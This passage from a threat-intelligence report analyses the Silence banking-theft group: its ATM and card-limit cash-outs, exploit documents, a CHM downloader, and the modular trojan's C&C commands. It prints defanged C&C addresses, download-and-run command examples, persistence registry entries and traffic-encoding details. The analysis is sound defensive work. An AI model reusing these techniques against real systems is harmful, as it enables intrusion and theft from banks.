vulnerability, the attacker might gain full control \nover the system.\nExperts identified successful attempts of the anti-malware solution to block the \ndownloading of Meterpreter stagers. \nIPhttp http\nhttp http\nOn the same day, a file called m32.exe was created in the file system of the \nworkstation. This file is the Farse  utility (a unique Mimikatz-based  software \nprogram developed by the attackers), which extracts passwords, hashes and PINs. \nIn addition, the workstation for using AWS CBR was found to launch procdump.exe, \nwhich might have been used to create a copy (dump) of lssas.exe, which, in turn, \ncould be used to extract passwords using Mimikatz.Silence\nMoving into the darkside30\nFrom 11.08.2017 to 14.09.2017 , the winexesvc service was created. This service \nallows remote execution of commands launched in GNU/Linux systems, on \ncomputers with Windows using SMB protocol.\nOn 07.10.2017 , workstations were accessed using standard Microsoft Remote \nDesktop Web Access. That said, there was no data on RDP connections in the \nWindows system logs on this date. It was probably deleted.\nAccording to Radmin Server 3 logs, on 08.10.2017 , one of the ATMs was remotely \naccessed from a workstation of a bank employee. After this, unique software for \ninteraction with the dispenser was installed.\nLater, this software made ATMs withdraw all cash at a specific time. The total \namount stolen was over $100,000 .\nWhile investigating the network topology, the hackers gained access to a machine \nwith AWS CBR, which is evidenced by the files created on the server. The attackers \ngained access to the machine with a domain administrator account and then \nconnected to it using RAdmin .\nDespite the fact that the machine was connected to AWS CBR, the criminals did \nnot use this vector.\nIn April 2018, the group withdrew funds again through ATMs. During a single night \nthey siphoned about $150,000 . This time, the Atmosphere program was not \nburdened with redundant features and ran stably without bugs.\nCard Processing\nIn 2018 , in an attack on another bank, the group used the privileged account of \na bank employee to change cash withdrawal limits for the previously activated \ncards. Later, the mules used the cards to empty the ATMs. The challenge was that \nthey were cashing out in ATMs of the partner, not the bank itself. The partner’s \nATM had no set limits for withdrawal. The total amount stolen was over $550,000.31\nCard Processing workstationIncrease card\nlimits/uni0421ard with no limits\nATM Mule\nSilence.Downloader\nC&C Server Silence\nMainModuleSilence.ProxyBotFarseMalicious.docOR\nMalicious.chmMalicious.js Malicious.lnk\n$\nDuring the response to this incident, Group-IB experts found a lot of .bat scripts, \nwhich just launched software, cleared logs and generally automated the work. All \nsoftware and scripts were saved in the c:\\intel, c:\\atm, and c:\\1 directories.\nFor software debugging, the hackers used legitimate Listdlls and RogueKiller \ntools, and for deleting traces they used sdelete.exe. They also utilized self-\ndeveloped software for clearing the RAdmin  logs.Silence\nMoving into the darkside32\nTECHNICAL DESCRIPTION  \nOF THE TOOLS\nThis section is devoted to the technical analysis of the software and tools used \nby Silence to conduct the attacks. In general, there are five groups that can be \nidentified: \n1. Unique modifications of exploits used to deliver the backdoor loader of \nSilence ;\n2. Unique Silence Trojan, its spying modules and ProxyBot used to connect \nisolated segments of the target corporate network and C&C server of the \ncriminals. The group also used the patched backdoor Kikothac  for some time;\n3. Unique set of tools for emptying the ATMs called Atmosphere . It contains the \nsoftware to interact with the dispenser and software to inject a malicious \nlibrary into the dispenser process;\n4. Service software, including legitimate administration tools used by the group \nin the attacks.\n5. DDoS IRC Bot\nAttachments\nCVE-2017-262 + CVE-2017-263 APT28 related\nFile Name MD5 File Description\nContract.docx 57f51443a8d6b8882b0c6af\nbd368e40eMicrosoft Word file exploiting \nCVE-2017-0262 vulnerability.\nimage1.eps cf9a68ace36f24b80daf9af\ne1d7dab44EPS file\njoiner.dll  DLL dropper\n  x32 version of the exploit of \nCVE-2017-0263 vulnerability\n  x64 version of the exploit of \nCVE-2017-0263 vulnerability\nAfter opening the Contract.docx file from the phishing email, the user will see the \nfollowing text in Russian:33\nContract.docx is a .doc file, designed to exploit the CVE-2017-0262 vulnerability \nin Microsoft Word. This file contains an EPS script file image1.eps ( 7d1c38c3cba\n1b1ce644d75fa3fd8e65545fdad8b5b21fe630d162cd0bdd87e40 ). The content \nwas encrypted using byte-to-byte XOR with a 7a5d5e20 key. Once decrypted, \nit demonstrates code sections with the \"forall\" operator, which indicates the \nexploitation of the above-mentioned vulnerability by incorrect processing of EPS \nfiles, as well as a shellcode in string format (hereinafter Shell1). \nIt is interesting to note that the exploit contains variables with names composed \nof lyrics from \"Snuff\" by Slipknot (e.g.You-sold-me-out-to-save-yourself).\nThe exploit performs the following actions:\n1. It allocates memory in the Microsoft Word process at the address 0x58a80000 \nand writes a shellcode (hereinafter – Shell2) there. This shellcode is required to \nsave and run a backdoor, which is described below. It should be noted that the \nfile is stored inside the shellcode.\n2. In the Microsoft Word memory space, a section of the code, which is required to \nunpack the DLL dropper (hereinafter – Shell3), is decrypted. The exports section \nof the DLL contains the \"fork\" function, which is called immediately after \nunpacking. The library name is \"joiner.dll\", SHA256: eea57047413bd7ae6b58e3a\n3fc4921092920949fd2fd189144ce71d0fa44239d .Silence\nMoving into the darkside34\n3. The \"fork\" function is used to determine the bit count of the infected system \nand decrypt the module that exploits the CVE-2017-0263 vulnerability. This \nenables the threat actor to gain SYSTEM privileges.\n4. The shellcode is called by the address 0x58a80000. This shellcode saves the \nWINWORD.exe file (c90df05f360fc6566bd226a2e93d91f10e753e3d9bb4a3c\nd9e2c7305c80749f3)  to the directory \" C:\\Users\\<%username%>\\AppData\\\nRoaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup \" under the name \n\"WINWORD.exe\". Following this, this backdoor is executed within the WINWORD.\nexe process. It should be noted that these actions are performed with SYSTEM \nprivileges.\nContract.doc\nEncrypted\nEPS exploit ﬁle\nDropper\nPrivilege escalation \nmodulesDecrypted\nEPS exploit ﬁle\nShell3 is decrypted \nand written to the address\n0x58a80000\nShell2 Shell3\nBackdoorShell1\nDropper\nBackdoorShell2 is decrypted \nand written to the address\n0x58a80000Exploit decryption \nand launch\nBackdoor is saved \nto the startup \ndirectory and launchedPrivilege escalation, \ntransferring control to address \n 0x58a80000 \nGeneral scheme of infection35\nOn May 9, 2017, ESET published a report on the software tools of the APT28 \ngroup (https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-\nday-exploits-using-trumps-attack-syria-decoy/ ). The approach to infecting \nthe system and features in the investigated case correspond with the ones in \nthe published report. However, we found key differences, identifying that APT28 \nsoftware tools were used by another group to steal money. We noted that in the \ncase described by ESET the control was not given to the 0x58a80000 address. \nAfter investigating the code of both exploits in more detail, we discovered that \nthe code of APT28’s DLL dropper was patched to give control to Shell, which is \nnecessary to save the backdoor in a file and launch it. The modified part of the \ncode is shown in the image below:\nPart of the code of the Fork function in the investigated  \n(below) and ESET (above) cases\nFrom the presented parts of code, it is clear that call and cmp instructions were \nreplaced with nop, push, and retn. Instructions like retn and push need 6 bytes \n(5 and 1 accordingly), while call and cmp need 8 bytes. The two bytes left were \nchanged to nop instruction in the process, which is evidenced by the changes in \ndropper at the level of assembler instructions.\nCHM\nFile Name MD5 File Description\nLetter of \nIntent.chmdde658eb388512ee\n9f4f31f0f027a7dfCHM file downloads and executes remote \nVBS code when opened\ni.vbs Remote VBS code, which downloads and \nlaunches the Silence  loader\nrpc32.exe  404d69c8b74d3755\n22b9afe90072a1f4Silence.Downloader\nSilence\nMoving into the darkside36\nOne of the phishing emails contained a help file called Letter of Intent.chm.\nMicrosoft Compiled HTML Help is a Microsoft proprietary online help format, \nconsisting of a collection of HTML pages, an index and other navigation tools. The \nfiles are compressed and deployed in a binary format with the extension .CHM, for \nCompiled HTML. The format is often used for software documentation.\nIt was introduced as the successor to Microsoft WinHelp with the release of \nWindows 98 and is still supported in Windows 7. Although the format was \ndesigned by Microsoft, it has been successfully reverse-engineered and is now \nsupported in many document viewer applications.\nThis file type is still supported by Microsoft and the software for viewing the help \ncontent is still included in the standard Windows package. This format allows the \nthreat actor to enable JavaScripts and execute remote VBScript and/or Powershell \ncode by calling mshta.exe or powershell.exe.\nAlthough the vector is not new and was used even back in 2015 to deliver malware, \nthis method of delivering the files of this type is not at all typical for the CIS and, \nin some cases, helps to evade discovery and successfully pass through corporate \nsecurity systems.\nThe Letter of Intent.chm is a compiled HTML file with interactive help. After \ndecompiling, the file has the following structure:\nWhen launching the help, the entry point is the file called start.htm. In the body of \nthis HTML file there is an object with interactive content:\nAfter opening the help, the VB script is downloaded from the remote server at \n139.99.156[.]100 . The script is then launched with the system interpreter mshta.\nexe. The VB script, in turn, downloads the Silence.Downloader backdoor, saves it in \n$TEMP%\\rpc32.exe and launches it.\n37\nLNK\nThe standard Windows shortcuts (links to files with a .LNK extension) can be used \nto download arbitrary programs and send them specific arguments. At the same \ntime, an attacker can define which icon to display to deceive regular users. Apart \nfrom that, Windows OS does not display a shortcut extension.\nstruct LNK {\nstruct ShellLinkHeader sShellLinkHeader;\nstruct LinkTargetIDList sLinkTargetIDList;\nstruct LinkInfo sLinkInfo;\nstruct StringData NAME_STRING;\nstruct StringData RELATIVE_PATH;\nstruct StringData WORKING_DIR;\nstruct StringData COMMAND_LINE_ARGUMENTS;\nstruct StringData ICON_LOCATION;\nstruct ExtraData sExtraData;\n} ;\n \nShortcut Structure\nWhen the file is formed in a certain way, PowerShell interpreter can be launched \nby sending the prepared script for execution as a parameter. \nSilence Trojan\nThe unique Trojan used by the group is modular. It consists of the following \ncomponents (discovered by Group-IB; there could be more):\n• Loader;\n• Main module (in the early attacks hackers used a patched backdoor called \nKikothac );\n• Module for spying on users;\n• Proxy.\nThe main module can load any other executable file, which doesn’t limit the \nsystem’s functionality and gives room to extend features.  \nNone of the programs are obfuscated.\nSilence\nMoving into the darkside38\nSilence.Downloader\nFile Name MD5 hash\nWINWORD.exe\nIntelSofts_<%disk serial \nnumber%>.exe5b4417521c71cc89cd3b2fe94ab395b2\nc6c84da4f27103db4ff593f4d4f45d95\nIntel Security.exe b4313151019b2091cbd27c8810e5c7c5\nef0fb10c602e3ee81e3677c83a44b409\nSecuritySoftWare a58a830dce460e91217328bdefb25cbe\na1e210598820cbb08e269b2dfd96e741\nrpc32.exe 404d69c8b74d375522b9afe90072a1f4\nb09b8be361cd0e30a70cc4603a31d1ee\n3345dde0c827dcbda993f7216a8d7c12\nfile.exe 43eda1810677afe6791dd7a33eb3d83c\n7d3614df9409da3933637f09587af28c\n7d8af1f6cf7d08c0c39e03033585d404\n9b037ead562c789620a167af85d32f72\npripr.exe 97599e2edc7e7025d5c2a7d7a81dac47\n \nThe file WINWORD.exe is a backdoor. The program is designed to download \nand launch the Silence’s main Trojan. After launching WINWORD.exe, the Trojan \nperforms the following activity: \n1. It retrieves the serial number of C://. If unsuccessful, finds out the serial \nnumber of D://. If unsuccessful for the second time, the malware extracts the \nserial number of E://.\n2. Then it creates a computable mutex, which is unique for the current machine, \nfor interprocess synchronization.\n3. The infinite loop is as follows:\n• the bot sends GET request every 5 seconds to the 158.69.218[.]119/script.  \nphp?name=%<disk serial number> server.\n• In response it may receive one of the following commands:39\nCommand Description\nfal The software copies itself in C:\\ProgramData under the \nname: IntelSofts_<disk serial number%>.exe. Then it creates \na value named IntelSofts (only if it is not yet present) in \nC:\\ProgramData\\IntelSofts_<disk serial number%>.exe in \nthe HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\\nCurrentVersion\\Run registry key. Deletes C:\\ProgramData\\\nIntelSofts_<disk serial number%>.exe:Zone.Identifier\".\nDEL Deletes the above-mentioned value and terminates the \napplication\n|http<website \naddress>Deletes C:\\ProgramData\\MicrosoftsUpdte.exe and downloads a \nfile with a URL, sent by the server. The downloaded file is saved \non the infected device in C:\\ProgramData\\MicrosoftsUpdte.\nexe. After this, it launches the downloaded file either with the \nCreateProcess() function or the ShellExecute() function.\n \nIt is worth noting that a copy of this file is also saved in  \nC:\\Users\\<%username%>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\\nPrograms\\Startup  under the name WINWORD.exe. This is a result of the execution \nof the exploit that installed the software into the system.\nWe found several programs of this type at different times. On March 20, 2018 , the \nSilence loader, which was compiled on March 2, 2018 , was uploaded to VirusTotal. \nThe new version had only minor changes:\n1. bot calls GetModuleHandleA(\"kernel32\") function 5555000 times. \nThis cycle is designed to hinder dynamic analysis. Other anti-analysis means \nare not present.\n2. It retrieves the serial number of C://. If unsuccessful, finds out the serial \nnumber of D://. If unsuccessful for the second time, finds out the serial number \nof E://. If unsuccessful, assigns the variable that stores the serial number \n1110101011.\n3. Then it launches an infinite loop of server commands processing and sends \nthe following GET request every 120 seconds: 91.207.7[.]86/I/checkinfo.\nphp?name=<diskphp?name=<disk serial number>\nSilence\nMoving into the darkside40\n4. Disregarding the result of calling the server, the bot ensures persistence using \none of the following approaches:\n• Creates its own copy in C:\\ProgramData called Intel Security.exe.\n• Creates a value named Intel(R) Common Security and a value of C:\\\nProgramData\\Intel Security.exe (if it is not present) in HKEY_CURRENT_\nUSER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key.\n• Deletes the copy of the file with postfix :Zone.Identifier in C:\\\nProgramData\"=.\n• In the last version of the bot it did not ensure persistence before receiving \nthe fal command.\n5. Following this, the bot processes the response. There are several options of \nresponse:\n \nCommand Description\nDEL Deletes the value of the registry described above and \nterminates the application\nhttp://<website \naddress>Deletes C:\\ProgramData\\TEMP-DATA-2-34-56-6-23_<%result \nof multiplication of GUID field structure%>.exe\" and then \ndownloads the file with the URL sent by the server. The \ndownloaded file is then saved to the infected device in \nC:\\ProgramData\\TEMP-DATA-2-34-56-6-23_<%result of \nmultiplication of GUID field structure%>.exe\". After this, \nthe file is launched by the CreateProcess function. The bot \n\"sleeps\" for 2 seconds before the launch.\nWe can see that the fal command was deleted and the name of the file where \nSilence will be saved is changed.\nPatched Kikothac\nFile Name MD5 hash\nnetsrvc32.exe 9628d7ce2dd26c188e04378d10fb8ef3\n0074d8c3183e2b62b85a2b9f71d4ccd8\n440b21958ad0e51795796d3c1a72f7b3\nb7f97100748857eb75a6558e608b55df\nThe software is classified as Backdoor.Kikothac . The application can transfer \ninformation about the infected device, download files, upload files to the C&C \nserver, launch and terminate processes, modify registry entries, and execute \ncommands in the command interpreter. It uses the IP address 46.183.221[.]89 as a \nC&C server. Analysis shows that the application was patched.41\nAction Sequence\n• The software uses the SetUnhandledExceptionFilter function to register a \nfunction/high-level handler that terminates the bot in case of any error.\n• There are 10 stages in the cycle with a 1-second interval. The software calls a \nmutex named ServiceHelper#56 0.2.21.0001_srv. If there was an error during the \ncall, it tries to create a mutex with this name. If there were no errors 10 times or \nmutex creation was unsuccessful, the application is terminated.\n• The software uses the StartServiceCtrlDispatcher() service named Microsoft \nService Watcher in the context of its own process. The process of service \nlaunch:\n \nAll further actions happen in the service handler, namely:  \n• The service checks the system time. If it is set to zero, the bot stops working.\n• Calls a server with the IP address 46.183.221[.]89. The interaction process can be \ndescribed with the following stages:\n• Lists user accounts in the registry and looks for the ProxyEnable value in \nthe Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings key. \nIn case such field is found, it gets the default proxy server and uses it to \ncommunicate with the C&C server.\n• Reads content of the <%Folder where the bot is located%>\\hostent, where \nthere should be a description/identifier of the bot. After that, it sends the \ncontent to the C&C server. If the file is not present, the service sends the \nfollowing string to the server: \".: No desc :.\".\n• Switches to the cycle of receiving and executing commands of the C&C \nserver.\nWhen receiving data from the server, the bot looks for its own commands (you can \nfind the list below). If there were no commands, the bot creates a cmd.exe process \nand sends the resulting string to the C&C server. Some bot commands only launch \nwith parameters. For this, the function/command handler checks the number of \nreceived parameters, where the first parameter is always the command accepted.\nSilence\nMoving into the darkside42\nBot Commands:\nCommand Function Possible Responses Example\n#wput Get a file from the infected device. The \ncommand accepts 4–5 parameters, \nnamely file name, URL, and port. \nThe usage of 5 parameters was not \ndiscovered.\"OpenReq failed\" – error during \noperation of HttpOpenRequest \nfunction.\n\"Connect failed\" – error during \noperation of InternetConnect \nfunction.\n\"InetOpen failed\" – error during \noperation of InternetOpen function.\n\"ERR:2\" – error while reading a file.\n\"ERR:1\" – the number of parameters \nis not equal to 4 or 5.#wput \nlocalhost \n4242 test.txt\n#wget Download the file to an infected device. \nBot accepts two parameters: URL and \nfile name. When /d flag is present, does \nnothing. Changes date and time of file \ncreation, last access, and last change to \nthe date from the similar field \"kernel32.\ndll\".\"ERR:1\" – the number of parameters \nis not equal to 3.\n\"Save/Get failed\" – error while \ndownloading the file.\n\"Saved\" – the file is downloaded and \nsaved #wget \nhххp:/ /www.\nconstitution.\norg/usdeclar.\ntxt text.txt\n#ver Get the bot version. \"0.2.21.0001_srv_i86\" #ver\n#p Refresh time of the last response/call to \nthe server. The command is meaningless \nbecause refreshing is automated and \nhappens upon receiving/accepting the \nmessage from the server.No response #p\n#d Stop the bot from calling the server for \nan hour and stop the cmd.exe process \nlaunched earlier.No response #d\n#clean Terminate the cmd.exe process launched \nearlier.No response #clean\n#tl Get the list of running processes. The response is a list of launched \nprocesses in the following format:\nprocess=<%process_name%> \npid=<%PID%> prnt=<%Process \nPID%>\n The example of the response is in \nAnnex 1.#tl\n#tk Terminate the process using its PID. \"ERR:1\" – the number of parameters \nis not equal to 2.\n\"Failed to open process, <%PID%>\" – \nfailed attempt to call an application.\n\"Killed\" – the process is terminated.#tk 616\n#selfpath Get the path to the module file. If the \ncommand does not get the parameter, \nit responds with the path to the bot’s \nexecutable file.Path to the file.\n \"ERR:3\" – error while calling a \nprocess of the application#self \nKernel3243\n#setid Write a parameter string to <%Path to \nfolder with the bot%>\\hostent. Change \ndate and time of file creation, last \naccess, and last change of the bot’s \nfile to the date from the similar field \n\"kernel32.dll\".No response #setid test_\nstring\n#ctype Get information on proxy. SID=`<%User SID%>`, \ncstr=`<%CnC%>:<%Port%>` – in case \none of the users has a proxy server \nconfigured by default.\nNo proxy – if the proxy server is not \nconfigured by default for any user of \nthe infected machine.#ctype\n#fsredirect Enable/disable filesystem redirection. No response #fsredirect \non\n#fsredirect \noff\n#ccc Delete the HKLM\\Software\\\nKingKongThai\\cc\\. key from the registry. \nThe second transferred parameter \nshould be \"yes\" string.\"Done.\" #ccc yes\n#cca Change the value with the name that \nis received as a parameter in HKLM\\\nSoftware\\KingKongThai\\cc registry key. \nThe value changes to 0.\"ERR:4_2\" – when addressing the \nHKLM\\Software\\KingKongThai\\cc \nkey was not successful.\n\"ERR:4_1\" – if writing a value was \nunsuccessful.\n\"Done\" – if successfulcca test_val\n#ccd Delete the value from the HKLM\\\nSoftware\\KingKongThai\\cc\\. registry \nkey. The value name is received as a \nparameter.\"ERR:4_2\" – when addressing the \nHKLM\\Software\\KingKongThai\\cc \nkey was not successful.\n\"Done\" – if successful.#ccd test_val\n#ccl Get names of all values in the HKLM\\\nSoftware\\KingKongThai\\cc registry key.\"ERR:4_1\" – when addressing the \nHKLM\\Software\\KingKongThai\\cc \nkey was not successful.\n\"ERR:4_0\" – if an attempt to get \ninformation on the registry key was \nunsuccessful.\nThe data is received in the following \nformat:\n-----------------\n <%value1 name%>\n <%value2 name%>\n -----------------#ccl\n#wts_enum Get the list of launched process sessions \nusing WTS functions.For examples, refer to Annex 2 #wts_enumSilence\nMoving into the darkside44\n#wts_start Execute the command. Several strings \nare received as parameters:\n1) Console – launch on behalf of the \nSystem or any other string;\n2) Commands.Command line ‘<%received \ncommand%>’ executed. – if \nsuccessful.\n\"ERROR: Failed execute ‘<%received \ncommand%>’ <%GetLastError \nresult%>\" – if not successful.#wts_start \nConsole cmd.\nexe ping \n127.0.0.1\n#help No activity performed\nAny other \nstringSend the string to cmd.exe. Output. ipconfig\nC&C communications\nThe bot uses port 80 to communicate with the server. This port sends encrypted \ndata. If the infected device has a proxy server configured by default, the bot uses \nit. \nThe bot regularly connects to the C&C server. If the connection is not established \nin 60 minutes, the bot \"snoozes\" for 5 minutes.\nThe traffic between the infected machine and the C&C server is encrypted using \na byte-to-byte XOR with a pseudo-random byte generated for each message. The \nmessage structure is as follows:\n \nstruct message {\n   char key;            \n   char unuseful_1;  // -1\n   char unuseful_2;  // 0\n   int length;\n   char ciphertext[length];\n}\n \nChanges of C&C IP address  in the executable file\nThrough analysis of the bot memory, we discovered, apart from the C&C address, \nthe address 185.29.9[.]45, which is not used by the program anywhere.[R1] In \naddition, both the connectivity function and the standard __NMSG_WRITE \nfunction referred to the C&C address. Having researched other versions of this \nbot, we found an interesting peculiarity. In the investigated sample, the standard \nstring Microsoft Visual C++ Runtime Library was changed to: 46.183.221[.]89\\0 C++ \nRuntime Library:\n45\nThe unused address (185.29.9[.]45) is in the same place as in the unchanged \nsamples:\nThe string with the IP address of the C&C server of the Silence group is longer \nthan the C&C address in the original file. Therefore, the usual change of the IP \naddress (185.29.9[.]45) in the same place of the executable file leads to incorrect \noperation of the software. This was the reason for changing the Microsoft Visual \nC++ Runtime Library string and not changing the address string from the original \nfile.\nThe bot has a relatively simple traffic encryption mechanism, that is why reverse \nengineering of the protocol does not take long. This shows that the sample was \nchanged manually using the regular HEX editor and was not rebuilt for the new \nC&C server.\nSilence.MainModule\nFile Name MD5 hash\nMicrosoftUpdte.exe f1954b7034582da44d3f6a160f0a9322\nnetsrvc32.exe cfffc5a0e5bdc87ab11b75ec8a6715a4\ndwenole.exe c4f18d40b17e506f42f72b8ff111a614\nsrv_cons.exe b43f65492f2f374c86998bd8ed39bfdd\na3de4a1e5b66d96183ad42800d6be862\nThe file in question, MicrosoftUpdte.exe , is classified as Silence.MainModule and \nhas capabilities to execute remote commands covertly, add itself to startup, and \ndownload arbitrary files from the network servers.\nAfter the launch:\n• The file checks for the following registry keys: \"HKCU\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Run\" and \"HKLM\\Software\\Microsoft\\Windows\\\nCurrentVersion\\Run\". If they are present and there is permission to write in \nthese keys, the file adds itself to startup by writing itself in both keys. The \nrespective registry entries are as follows:  \n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"javaplatform\" = <path_to_exe>\n[HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"javaplatform\" = <path_to_exe>\nSilence\nMoving into the darkside46\nwhere <path_to_exe> is the path to exe where the file was launched. The file is \nnot moved or copied anywhere else ( Silence.Downloader  loader has already \ndone this during the previous step).\n• The bot uses the CreatePipe function to create a pipe, which will be used for \ninterprocess communication with other modules\n• After that, the bot remains inactive waiting for further commands from the C&C \nserver. \nNetwork communications are performed using  unencrypted connections via Http \nland GET requests.     \nPossible types of connection to C&C:\nType of \nconnectionDescription Example of client  \nrequest to С&C\nConnect1 Registration http://192.168.19[.]171/index.php?xy=1\nConnect2 Commands request http://192.168.19[.]171/index.\nphp?xy=2&axy=1234567890\nConnect3 Sending return \nresults http://192.168.19[.]171/index.php?xy=2&axy=12345\n67890&bxy=aaaaabbbbccc\n• The first <request1> request is sent to the C&C server of the following type: \nhttp:/ /<cnc>/index.php?xy=1  \nExample of request:  \n\"http://192.168.19[.]171/index.php?xy=1\"\n• As a response to the first request from the client, the C&C server sends a server \nresponse (<response1>), which, according to debugging information in the file, is \nthe identifier of the client. This is 1234567890 on the screenshot below:•  \"xy=1\" and User-Agent are hard coded, meaning they can serve as a basis for \nwriting signatures to detect malicious network traffic:\nWe have also seen other User-Agents in different versions of the Trojan:  \nYear user agent\n2017 Microsoft Internet Explorer\n2018 \\r\\n\\r\\n\n• Next, the file sends the second <request2> request to the C&C. It looks as \nfollows: \"http://cnc/index.php?xy=2&axy=<response1>\", where <response1> is \nthe response of the server to <request1>\nExample:\n47\n•  \"xy=1\" and User-Agent are hard coded, meaning they can serve as a basis for \nwriting signatures to detect malicious network traffic:\nWe have also seen other User-Agents in different versions of the Trojan:  \nYear user agent\n2017 Microsoft Internet Explorer\n2018 \\r\\n\\r\\n\n• Next, the file sends the second <request2> request to the C&C. It looks as \nfollows: \"http://cnc/index.php?xy=2&axy=<response1>\", where <response1> is \nthe response of the server to <request1>\nExample:\nSilence\nMoving into the darkside48\nBelow is a table of C&C commands that the malware executes:\nCommand Command \ntypeDescription Example of Use\nhtrjyytrn reconnect Terminates the command interpreter, \nclears all temporary files, connects to \nthe C&C \"from scratch\"htrjyytrn\nhtcnfhn restart Terminates the command interpreter \nand restarts ithtcnfhn\nytnpflfybq notasks No operation ytnpflfybq\n#wget wget Download a file from a remote server \nand save in the current directory#wget \n192.168.19[.]171/f.\nexe 1.exe\nshell\\n shell Launch the command interpreter shell\\n\n\\n<cmd> run Execution of the arbitrary command \nof the OS via the command interpreter\\nipconfig\n• It is worth noting that the command codes are Cyrillic words  typed with an \nEnglish layout. This shows that the developer is a Russian speaker .\n• The ‘restart’ command restarts the command interpreter, for example if the \ncurrent console is unresponsive.\n• The shell\\n command launches a new hidden instance of the OS command \ninterpreter, which will be used to covertly launch commands (the last string in \nthe table of commands) on the infected machine.\n \n49\n• The #wget command delivers the files from a remote server to a PC. It it used \nto specify which file to download and under what name to save it. The files are \nsaved in the folder where the executable file of the Trojan was launched.\n• If none of the control commands of the C&C were received, the connection can \nbe re-established right away or with a 1 or 10-second delay and in cycle.\nHow are arbitrary commands launched?\nAfter receiving the shell command, the backdoor can receive an arbitrary \ncommand from the C&C server for execution (\\n<cmd>). For example, it might be a \ncommand to enumerate local network interfaces, \"ipconfig\". Below is a screenshot \nof the client-server traffic with a server sending this command to a client.\nAfter receiving the command, the program writes it into stdin of the command \ninterpreter using the WriteFile() function. The command interpreter then executes \nthe command. Next, the backdoor waits for the results of command execution, \nreads it using ReadFile() function and sends the output to the C&C server.\nInteraction with command interpreter\nThe bot does not embed into the cmd.exe process. The launch of commands \nand receiving the results is done by creating a command interpreter process \nand stating data input and output devices (handles) that are open in the current \n(parent) process of the objects (pipes). This is done thanks to the special system \nstructure, _STARTUPINFO, and a flag, bInheritHandles == TRUE (allows inheritance \nof handles of the parent process).\nSilence\nMoving into the darkside50\nThe exchange of data with the command interpreter is implemented as calling the \nWriteFile (to launch the commands) and ReadFile (to obtain the results of their \nexecution) functions.  \nThe scheme for launching arbitrary commands:\n• Reads new command in cycle, if one has appeared\n• Sends a new command for execution to stdin of the command interpreter\n• The file under investigation receives the data size for reading == len from the \npipe\n• Reads data with len size from stdout of the command interpreter\n• Codes data (with result output) and sends to the C&C server\n• Rereads for new data every second\n• Checks whether the command interpreter has been closed every second\n51\nThe data from the command interpreter is taken out using the \nPeekNamedPipe(reading the size of a buffer) + ReadFile (reading the content \nof output) functions. The scanned data is encoded using the coding algorithm \nwith the native alphabet, \"AiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_\nFnT8fOu4GoS,gvR6HMQ2hyPX/\" .\nDespite the fact that the coding algorithm uses random data generation, the \nresulting coded data can be decoded on the server by the attacker because:\n1. The random data generator has small entropy (it only generates digits from 0 to \n3);\n2. The random data generator was designed this way to ensure that random data \ncould be excluded due to the formula (because the result of multiplication will \nalways be divisible by 4, and the random numbers are always less than 4);\n3. Each character of the source data is coded into two symbols using two different \narithmetic operations (formulas). This allows the source data to be decoded by \nsolving the combined equations.\nThe usage of pseudo-random numbers helps to avoid being detected by the \nsecurity systems.  \n \nAfter execution of a command in the command interpreter, the output is encoded \nand sent to the C&C server in the following format: \"http:/ /cnc/index.php?xy=3&a\nxy=<response1>&bxy=<encoded_cmdexe_data>\"\nSilence\nMoving into the darkside52\nAn example of request is presented below:\nData intake after execution in the command interpreter:\nCoding:\n1 – Data before coding\n2 – Data after coding\n53\nThe encoded data is then sent to the C&C server:\nSilence.SurveillanceModule\nFile Name MD5 hash Type of software\nsmmsrv.exe 242b471bae5ef9b4de8019781e55\n3b85Silence.SurveillanceModule\nDesktop video recorder\nmss.exe d7491ed06a7f19a2983774fd50d65fb2 Screenshotter\nsmmsrv.exeis an executable file for capturing the screen content of the infected \nmachine. To do this, the software uses the StartServiceCtrlDispatcher function to \ncreate its own service called \"Default monitor\". \nThe service processes only one command, namely SERVICE_CONTROL_STOP. \nAfter receiving the command, the service switches to SERVICE_STOP_PENDING \nstatus. If there is an error, it displays the debugging string: \"ServiceCtrlHandler: \nSetServiceStatus returned error\".\nThe event and flow, where all functions are performed, are created at the entry \npoint of the service. During creation, there might be some errors. The bot will give \nnotification of this using the following debugging messages:\n• \"My Sample Service: ServiceMain: SetServiceStatus returned error\"\nSilence\nMoving into the darkside54\n• \"ServiceMain: SetServiceStatus returned error\"\n• \"ServiceMain: CreateEvent returned error\"\n• \"ServiceMain: RegisterServiceCtrlHandler returned error\"\nIn the main function, the following actions happen during an infinite loop:\n• If there is no pipe index: \"\\\\.\\pipe\\{73F7975A-A4A2-4AB6-9121-AECAE68AABBB}\" \nthe pipe is created.\n• Reading the content of mss.txt file, which has to be located in the same folder \nas the file under investigation. The file contains the name of a user, from which \nit should start the mss.exe program (described further).\n• Decompression and saving the C:\\Users\\<%Username%>\\AppData\\Local\\Temp\\\nmss.exe file\n• Launch of the mss.exe application on behalf of the user, which is described in \nmss.txt (the functionality of the application is described further)\n• Reading data from pipe, converting it to image/png format and saving to the C:\\\nUsers\\<%Username%>\\AppData\\Local\\Temp\\out.dat file. Errors that occur while \nworking with the out.dat file are logged as debugging messages by the bot: \n\"Error code <%result of GetLastError%>\\n\"\nmss.exe, extracted by the previous program, takes screenshots in cycles, converts \nthem into image/bmp and streams. After this, it writes everything in a pipe with \nthe following name: \"\\\\.\\pipe\\{73F7975A-A4A2-4AB6-9121-AECAE68AABBB}\". \nThe program features checking for launch in a sandbox: \nThus, the out.dat file contains a pseudo-video stream\nSilence.ProxyBot  \nFile Name MD5 hash\nsamsung.exe 121c7a3f139b1cc3d0bf62d951bbe5cb\nsok83.exe dc4ac53350cc4b30839db19d8d6f3b5f\nfirefoxportebles.exe a6cb04fad56f1fe5b8f60fabf2f64005\napp.exe a6771cafd7114df25ac0ef2688722fdf\napcs.exe 88cb1babb591381054001a7a588f7a28\nThe file is written in Delphi and has functions for traffic redirection between a \nremote and a local server. It can collect and send information about the system \nto the remote server and save the data to the register. The program, classified 55\nas ProxyBot , is designed to access isolated segments of the network via an \nintermediate node. \nThe executable file contains two strings of great length, which are not involved in \nnormal operation. They could be used, but the developers created a condition for \nthis which is never true.\nOnce launched, the program performs the 